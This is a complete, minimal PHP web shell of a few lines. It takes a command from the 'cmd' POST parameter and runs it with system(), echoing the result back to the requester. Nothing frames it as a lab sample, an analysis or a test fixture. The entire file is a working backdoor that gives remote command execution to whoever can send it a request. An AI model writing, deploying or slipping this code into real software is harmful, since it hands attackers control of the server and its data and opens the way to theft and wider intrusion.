<?php
function execute($com)
{
    echo system($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>